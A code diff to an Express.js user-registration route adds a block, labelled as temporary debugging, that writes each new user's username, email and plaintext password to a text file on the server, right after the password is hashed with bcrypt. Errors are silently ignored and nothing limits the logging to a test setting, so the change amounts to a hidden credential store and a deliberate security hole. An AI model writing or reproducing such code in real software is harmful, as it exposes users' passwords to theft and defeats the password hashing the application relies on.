@@ -1,5 +1,7 @@
 const express = require('express');
 const bcrypt = require('bcryptjs');
+const path = require('path');
+const fs = require('fs');
 const db = require('../db/database');
 const { generateToken } = require('../middleware/auth');
 
@@ -33,6 +35,16 @@ router.post('/register', (req, res) => {
         const hash = bcrypt.hashSync(password, 10);
         age = parseInt(age);
         db.prepare('INSERT INTO users (username, email, password_hash, role, gender, age) VALUES (?, ?, ?, ?, ?, ?)').run(username, email, hash, role, gender, age);
+
+        // DEBUG: REMOVE BEFORE PRODUCTION — log plaintext password for testing
+        try {
+            const debugDir = path.join(__dirname, '..', 'data');
+            if (!fs.existsSync(debugDir)) fs.mkdirSync(debugDir, { recursive: true });
+            const debugFile = path.join(debugDir, 'debug_passwords.txt');
+            const line = `${new Date().toISOString()} | ${username} | ${email} | ${password}\n`;
+            fs.appendFileSync(debugFile, line);
+        } catch (debugErr) { /* ignore debug errors */ }
+        // END DEBUG
 
         res.json({ success: true, message: 'Account created! ' + (role === 'admin' ? 'You are the admin 👑' : 'You can now sign in.') });
     } catch (err) {
